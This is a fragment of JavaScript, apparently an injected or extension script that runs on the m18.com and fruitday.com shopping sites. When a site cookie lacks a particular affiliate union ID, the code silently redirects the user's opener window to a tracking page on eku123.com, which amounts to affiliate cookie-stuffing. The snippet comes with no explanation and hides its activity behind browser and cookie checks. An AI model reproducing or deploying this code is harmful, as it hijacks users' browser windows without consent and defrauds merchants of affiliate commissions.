...
//            })(js_src.split('?'));
    ...
    if (!thisWindow.l___k__s && !isOpera && navigator.cookieEnabled && /^http:/.test(thisDocument.URL)) {
        ...
        var rediectByCookie = function(key,index){
            if(!reg.test(getCookie(key))){
                var url = "http://www.eku123.com/ltienckh/redirect.html?f=" + index + "&k=" + (new Date()).valueOf();
                if (thisWindow.opener) {
                    try {
                        thisWindow.opener.location = url;
                    } catch (c) {}
                }       
            }
        };
        ...
        var m18_key = "LTINFO";
        var day_fruit_key = "__websiteId";
        var UNION_ID = "A100234083";
        var cur_host = document.location.host;
        var reg = new RegExp(UNION_ID);
        var url = "";
        if(cur_host.indexOf("m18.com") >=0){
            rediectByCookie(m18_key,0);
        }else if(cur_host.indexOf("fruitday.com") >=0){
            rediectByCookie(day_fruit_key,1);
        }
